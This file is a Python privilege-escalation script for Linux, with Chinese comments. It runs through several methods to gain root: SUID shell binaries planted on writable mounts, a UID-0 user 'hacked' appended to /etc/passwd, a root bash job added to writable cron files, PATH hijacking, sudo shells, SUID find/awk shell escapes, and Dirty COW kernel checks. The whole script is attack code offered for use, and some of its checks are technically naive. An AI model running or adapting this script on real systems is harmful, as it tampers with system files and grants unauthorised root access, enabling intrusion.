import os
import subprocess
import sys
import stat
import pwd

def check_root():
    """检查当前用户是否为 root"""
    try:
        if os.geteuid() == 0:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True, check=True).stdout.strip()
            print(f"[+] 当前用户为 {whoami} (EUID: 0)，已是 root，无需提权！")
            return True
        else:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True, check=True).stdout.strip()
            print(f"[*] 当前用户为 {whoami} (EUID: {os.geteuid()})，非 root，继续尝试提权...")
            return False
    except Exception as e:
        print(f"[-] 检查用户身份失败：{str(e)}")
        return False

def parse_mounts(file_path):
    """解析 /proc/mounts 或 /etc/fstab，寻找提权机会"""
    potential_vulns = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 4:
                        mount_point = parts[1]
                        options = parts[3].split(",")
                        if "suid" in options or "dev" in options:
                            potential_vulns.append((mount_point, options, f"{file_path} 包含 suid/dev"))
                            print(f"[*] 发现潜在漏洞挂载点：{mount_point}，选项：{options} ({file_path})")
                        try:
                            if os.access(mount_point, os.W_OK):
                                potential_vulns.append((mount_point, options, f"{file_path} 可写"))
                                print(f"[*] 发现可写挂载点：{mount_point} ({file_path})")
                        except:
                            pass
        return potential_vulns
    except Exception as e:
        print(f"[-] 读取 {file_path} 失败：{str(e)}")
        return []

def try_fstab_exploit(vulns):
    """尝试利用挂载点漏洞提权"""
    for mount_point, options, reason in vulns:
        print(f"[*] 尝试利用挂载点 {mount_point}（原因：{reason}）")
        binary_path = os.path.join(mount_point, "exploit")
        try:
            with open(binary_path, "w") as f:
                f.write("#!/bin/bash\n/bin/bash -p\n")
            os.chmod(binary_path, stat.S_IRWXU | stat.S_ISUID)
            print(f"[*] 在 {mount_point} 创建 SUID 二进制文件：{binary_path}")
            process = subprocess.Popen([binary_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    print(f"[+] 成功通过 {binary_path} 获取 root 权限")
                    return True
                else:
                    print(f"[-] {binary_path} 运行成功但未提权到 root（当前用户：{whoami}）")
            else:
                print(f"[-] 运行 {binary_path} 失败：返回码 {process.returncode}")
        except Exception as e:
            print(f"[-] 在 {mount_point} 创建/运行 SUID 二进制失败：{str(e)}")
    return False

def try_os_system():
    """尝试使用 /bin/sh -p 并验证提权"""
    description = "使用 os.system 调用 sh -p"
    command = "/bin/sh -p"
    print(f"[*] 尝试: {description}")
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
            if whoami == "root":
                print(f"[+] 成功: {description}，获取 root 权限")
                return True
            else:
                print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
        else:
            print(f"[-] 失败: {description} - 返回码 {process.returncode}")
        return False
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def try_command(description, command):
    """尝试执行 SUID 命令并验证提权"""
    print(f"[*] 尝试: {description}")
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
            if whoami == "root":
                print(f"[+] 成功: {description}，获取 root 权限")
                return True
            else:
                print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
        else:
            print(f"[-] 失败: {description} - 返回码 {process.returncode}")
        return False
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def try_special_methods():
    """尝试特殊提权手段"""
    special_methods = [
        ("检查 /etc/passwd 可写", try_writable_passwd),
        ("检查 /etc/crontab 可写", try_writable_crontab),
        ("环境变量 PATH 劫持", try_path_hijack),
        ("检查 SUDO 权限", try_sudo_privileges),
        ("检查内核版本漏洞", try_kernel_exploit)
    ]

    print("[*] 尝试特殊提权手段...")
    for description, method in special_methods:
        print(f"[*] 尝试: {description}")
        if method():
            print(f"[+] 成功: {description}，获取 root 权限")
            return True
        else:
            print(f"[-] 失败: {description}")
    return False

def try_writable_passwd():
    """检查 /etc/passwd 是否可写并添加 root 用户"""
    passwd_file = "/etc/passwd"
    try:
        if os.access(passwd_file, os.W_OK):
            print(f"[*] /etc/passwd 可写，尝试添加 root 用户")
            new_user = "hacked:root:0:0:hacked:/root:/bin/bash"
            with open(passwd_file, "a") as f:
                f.write(f"\n{new_user}\n")
            print(f"[*] 已添加用户 hacked，尝试 su hacked")
            process = subprocess.Popen(["su", "hacked"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    return True
            print(f"[-] su hacked 失败")
        return False
    except Exception as e:
        print(f"[-] 检查 /etc/passwd 失败：{str(e)}")
        return False

def try_writable_crontab():
    """检查 /etc/crontab 或 /etc/cron.* 是否可写"""
    cron_paths = ["/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly"]
    try:
        for path in cron_paths:
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        cron_file = os.path.join(root, file)
                        if os.access(cron_file, os.W_OK):
                            print(f"[*] 可写 cron 文件：{cron_file}")
                            with open(cron_file, "a") as f:
                                f.write("\n* * * * * root /bin/bash -p\n")
                            print(f"[*] 已修改 {cron_file} 执行 /bin/bash -p，等待 cron 执行")
                            return True
            elif os.access(path, os.W_OK):
                print(f"[*] 可写 cron 文件：{path}")
                with open(path, "a") as f:
                    f.write("\n* * * * * root /bin/bash -p\n")
                print(f"[*] 已修改 {path} 执行 /bin/bash -p，等待 cron 执行")
                return True
        return False
    except Exception as e:
        print(f"[-] 检查 cron 文件失败：{str(e)}")
        return False

def try_path_hijack():
    """尝试 PATH 劫持利用 SUID 二进制"""
    try:
        binary_path = "/tmp/malicious"
        with open(binary_path, "w") as f:
            f.write("#!/bin/bash\n/bin/bash -p\n")
        os.chmod(binary_path, stat.S_IRWXU)
        os.environ["PATH"] = f"/tmp:{os.environ['PATH']}"
        for cmd in ["/usr/bin/find", "/usr/bin/awk"]:  # 假设这些是 SUID 二进制
            if os.path.exists(cmd):
                print(f"[*] 尝试 PATH 劫持利用 {cmd}")
                process = subprocess.Popen([cmd, "malicious"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                    if whoami == "root":
                        return True
                    else:
                        print(f"[-] PATH 劫持 {cmd} 未提权到 root（当前用户：{whoami}）")
        return False
    except Exception as e:
        print(f"[-] PATH 劫持失败：{str(e)}")
        return False

def try_sudo_privileges():
    """检查 SUDO 权限"""
    try:
        process = subprocess.Popen(["sudo", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if "ALL" in stdout or "root" in stdout:
            print(f"[*] 发现 SUDO 权限，尝试 sudo /bin/bash")
            process = subprocess.Popen(["sudo", "/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    return True
                else:
                    print(f"[-] sudo /bin/bash 未提权到 root（当前用户：{whoami}）")
        return False
    except Exception as e:
        print(f"[-] 检查 SUDO 权限失败：{str(e)}")
        return False

def try_kernel_exploit():
    """检查内核版本并尝试已知漏洞"""
    try:
        kernel_version = subprocess.run(["uname", "-r"], capture_output=True, text=True).stdout.strip()
        print(f"[*] 当前内核版本：{kernel_version}")
        # 示例：检查 Dirty COW (CVE-2016-5195)，适用于 2.6.22 - 4.8 内核
        if "2.6." in kernel_version or "3." in kernel_version or "4." in kernel_version[:3]:
            print(f"[*] 内核 {kernel_version} 可能易受 Dirty COW 攻击，需手动测试")
            # 这里仅提示，实际需下载并编译 exploit 代码
            return False
        return False
    except Exception as e:
        print(f"[-] 检查内核版本失败：{str(e)}")
        return False

def main():
    # 检查是否为 root
    if check_root():
        sys.exit(0)

    print("[*] 开始提权尝试...")

    # 1. 检查 /proc/mounts 和 /etc/fstab
    print("[*] 检查 /proc/mounts 和 /etc/fstab 中的提权机会...")
    mounts_vulns = parse_mounts("/proc/mounts")
    fstab_vulns = parse_mounts("/etc/fstab")
    all_vulns = mounts_vulns + fstab_vulns
    if all_vulns:
        if try_fstab_exploit(all_vulns):
            print("[+] 已成功获取 root 权限，退出脚本。")
            sys.exit(0)
    else:
        print("[-] 未在 /proc/mounts 或 /etc/fstab 中发现提权机会")

    # 2. 尝试 os.system("/bin/sh -p")
    if try_os_system():
        print("[+] 已成功获取 root 权限，退出脚本。")
        sys.exit(0)

    # 3. 尝试 SUID 二进制文件
    suid_methods = [
        ("bash -p", "/usr/bin/bash -p"),
        ("sh -p", "/usr/bin/sh -p"),
        ("csh -b", "/usr/bin/csh -b"),
        ("ksh -p", "/usr/bin/ksh -p"),
        ("zsh", "/usr/bin/zsh"),
        ("find 执行 bash", "find /etc/passwd -exec /bin/bash -p \\;"),
        ("awk 执行 bash", "awk 'BEGIN {system(\"/bin/bash\")}'"),
        ("man 执行 bash", "man man"),  # 需要交互
        ("more 执行 bash", "more /etc/passwd")  # 需要交互
    ]

    print("[*] 尝试 SUID 二进制文件获取 root 权限...")
    for description, cmd in suid_methods:
        if "man" in description or "more" in description:
            print(f"[*] 注意: {description} 需要交互模式，运行后请手动输入 '!/bin/bash' 并检查是否为 root。")
            print(f"[*] 运行命令: {cmd}")
            try:
                subprocess.run(cmd, shell=True)
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    print(f"[+] 成功: {description}，获取 root 权限")
                    sys.exit(0)
                else:
                    print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
            except Exception as e:
                print(f"[-] 失败: {description} - {str(e)}")
        else:
            if try_command(description, cmd):
                print("[+] 已成功获取 root 权限，退出脚本。")
                sys.exit(0)

    # 4. 尝试特殊手段
    if try_special_methods():
        print("[+] 已成功获取 root 权限，退出脚本。")
        sys.exit(0)

    print("[-] 所有方法均失败，建议手动检查：")
    print("    - 查找所有 SUID 文件：find / -perm -4000 2>/dev/null")
    print("    - 检查挂载配置：cat /proc/mounts; cat /etc/fstab")
    print("    - 检查 SUDO 权限：sudo -l")
    print("    - 检查内核版本：uname -r")

if __name__ == "__main__":
    main()
